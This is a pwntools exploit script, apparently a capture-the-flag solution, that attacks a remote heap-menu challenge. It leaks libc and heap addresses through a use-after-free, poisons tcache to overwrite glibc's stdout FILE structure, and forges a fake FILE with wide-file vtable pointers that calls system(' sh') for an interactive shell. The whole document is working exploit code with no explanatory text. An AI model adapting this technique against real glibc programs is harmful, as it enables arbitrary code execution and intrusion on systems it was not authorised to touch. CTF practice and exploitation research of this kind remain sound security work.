from pwn import *

exe = context.binary = ELF("./chall")
libc = exe.libc

def menu(choice):
    io.sendlineafter(b'> ', str(choice).encode())

def malloc(idx, size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'idx?: ', str(idx).encode())
    io.sendlineafter(b'size?: ', str(size).encode())
    io.sendlineafter(b'data?: ', data)

def view(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'idx?: ', str(idx).encode())

def free(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'idx?: ', str(idx).encode())

def edit(idx, data):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'idx?: ', str(idx).encode())
    io.sendlineafter(b'data?: ', data)

io = remote("chall.polygl0ts.ch", 6242)

malloc(0, 0x420, b'A'*8)
malloc(1, 0x1f0, b'B')

free(0)
view(0)
io.recvuntil(b'meow: ')
libc.address = u64(io.recv(8)) - 0x211b20

free(1)
view(1)
io.recvuntil(b'meow: ')
heap = u64(io.recv(8)) << 12

edit(1, p64((heap>>12) ^ (libc.sym._IO_2_1_stdout_)))
malloc(0, 0x1f0, b'A'*8)

w_offset = 0xE0
fs = flat(
    {
        0x00: b' sh'.ljust(8, b'\x00'),
        0x88: p64(libc.address + 2176896),
        0xA0: p64(libc.sym._IO_2_1_stdout_ + 0xE0),
        0xC0: p32(-1, sign="signed"),
        0xD8: libc.sym['_IO_wfile_jumps'] - 0x38 + 0x18,
        w_offset+0xE0: p64(libc.sym._IO_2_1_stdout_ + 0xE0),
        w_offset+0x68: p64(libc.sym['system'])
    },
    filler=b'\x00'
)

malloc(0, 0x1f0, fs)

io.interactive()
